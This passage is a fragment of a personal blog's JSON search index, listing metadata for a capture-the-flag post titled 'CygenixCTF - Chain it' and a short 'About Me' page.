","date":"2024-08-26","objectID":"/chainit/:1:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":null,"content":"About Me","date":"0001-01-01","objectID":"/aboutme/","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Background Information I like computers 🤓❗ ","date":"0001-01-01","objectID":"/aboutme/:0:0","tags":null,"title":"About Me","uri":"/aboutme/"}]